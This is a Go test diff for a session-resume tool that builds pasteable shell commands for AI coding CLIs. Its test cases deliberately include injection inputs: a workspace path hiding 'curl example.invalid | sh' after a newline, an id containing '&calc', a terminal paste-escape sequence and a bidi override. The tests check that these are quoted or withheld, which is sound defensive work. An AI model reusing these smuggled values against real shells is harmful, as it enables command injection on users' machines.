@@ -1,8 +1,10 @@
 package session
 
 import (
+	"errors"
 	"os"
 	"path/filepath"
+	"runtime"
 	"strings"
 	"testing"
 )
@@ -1104,6 +1106,32 @@ func TestValidateResume(t *testing.T) {
 	}
 }
 
+func TestValidateHandoff(t *testing.T) {
+	workspace := t.TempDir()
+	gone := filepath.Join(workspace, "gone")
+	row := Row{Provider: ProviderCodex, ID: "id", CWD: workspace}
+
+	t.Setenv("PATH", filepath.Join(t.TempDir(), "empty-bin"))
+	if err := ValidateHandoff(row, ProviderClaude); err == nil || !strings.Contains(err.Error(), "claude not found in PATH") {
+		t.Fatalf("missing CLI err = %v, want 'claude not found in PATH'", err)
+	}
+
+	withFakeCommand(t, "claude")
+	if err := ValidateHandoff(row, ProviderClaude); err != nil {
+		t.Fatalf("valid hand-off err = %v, want nil", err)
+	}
+	if err := ValidateHandoff(row, ProviderAntigravity); !errors.Is(err, errAntigravityTarget) {
+		t.Fatalf("source-only target err = %v, want %v", err, errAntigravityTarget)
+	}
+
+	// The copy is written for the source workspace, not for the directory a
+	// Claude source happens to resume from.
+	moved := Row{Provider: ProviderClaude, ID: "id", CWD: gone, LaunchCWD: workspace}
+	if err := ValidateHandoff(moved, ProviderClaude); err == nil || !strings.Contains(err.Error(), "workspace not found") {
+		t.Fatalf("missing workspace err = %v, want 'workspace not found'", err)
+	}
+}
+
 func TestCompoundRejectsSameProviderHandoffOnly(t *testing.T) {
 	row := Row{Provider: ProviderCodex, ID: "multica-session", CWD: t.TempDir(), HandoffOnly: true}
 	for name, action := range map[string]func() error{
@@ -1171,5 +1199,82 @@ func TestRecipeForQuotesCommandAndReportsStorage(t *testing.T) {
 	}
 	if !strings.Contains(recipe.CommandString, "'session with spaces'") {
 		t.Fatalf("recipe command did not quote session id: %q", recipe.CommandString)
+	}
+}
+
+// TestRecipeShellLine: the pasteable line enters the workspace Resume would
+// launch in, and is withheld when metadata would smuggle a control character
+// into the shell. On Windows it is the command alone, and only unquoted.
+func TestRecipeShellLine(t *testing.T) {
+	for name, test := range map[string]struct {
+		row     Row
+		want    string
+		windows string
+	}{
+		"plain workspace": {
+			row:     Row{Provider: ProviderCodex, ID: "abc-123", CWD: "/work/api"},
+			want:    "cd /work/api && codex resume abc-123",
+			windows: "codex resume abc-123",
+		},
+		"quoted workspace": {
+			row:     Row{Provider: ProviderCodex, ID: "abc-123", CWD: " /work/it's here "},
+			want:    `cd '/work/it'"'"'s here' && codex resume abc-123`,
+			windows: "codex resume abc-123",
+		},
+		"claude launch directory": {
+			row:     Row{Provider: ProviderClaude, ID: "abc-123", CWD: "/work/api/sub", LaunchCWD: "/work/api"},
+			want:    "cd /work/api && claude --resume abc-123",
+			windows: "claude --resume abc-123",
+		},
+		"unknown workspace": {
+			row:     Row{Provider: ProviderCodex, ID: "abc-123", CWD: "(unknown)"},
+			want:    "codex resume abc-123",
+			windows: "codex resume abc-123",
+		},
+		"relative workspace": {
+			row:     Row{Provider: ProviderCodex, ID: "abc-123", CWD: "-P"},
+			want:    "codex resume abc-123",
+			windows: "codex resume abc-123",
+		},
+		"empty workspace": {
+			row:     Row{Provider: ProviderCodex, ID: "abc-123"},
+			want:    "codex resume abc-123",
+			windows: "codex resume abc-123",
+		},
+		"quoted id": {
+			row:  Row{Provider: ProviderCodex, ID: "abc&calc", CWD: "/work/api"},
+			want: "cd /work/api && codex resume 'abc&calc'",
+		},
+		"hand-off only": {
+			row: Row{Provider: ProviderAntigravity, ID: "abc-123", CWD: "/work/api", HandoffOnly: true},
+		},
+		"newline in workspace": {
+			row:     Row{Provider: ProviderCodex, ID: "abc-123", CWD: "/work/api\ncurl example.invalid | sh"},
+			windows: "codex resume abc-123",
+		},
+		"escape sequence in id": {
+			row: Row{Provider: ProviderCodex, ID: "abc\x1b[201~123", CWD: "/work/api"},
+		},
+		"bidi override in workspace": {
+			row:     Row{Provider: ProviderCodex, ID: "abc-123", CWD: "/work/\u202eipa"},
+			windows: "codex resume abc-123",
+		},
+	} {
+		t.Run(name, func(t *testing.T) {
+			recipe := RecipeFor(test.row, ResumeOptions{})
+			if got := recipe.shellLine(false); got != test.want {
+				t.Fatalf("shell line = %q, want %q", got, test.want)
+			}
+			if got := recipe.shellLine(true); got != test.windows {
+				t.Fatalf("windows shell line = %q, want %q", got, test.windows)
+			}
+			want := test.want
+			if runtime.GOOS == "windows" {
+				want = test.windows
+			}
+			if got := recipe.ShellLine(); got != want {
+				t.Fatalf("ShellLine() = %q, want %q", got, want)
+			}
+		})
 	}
 }
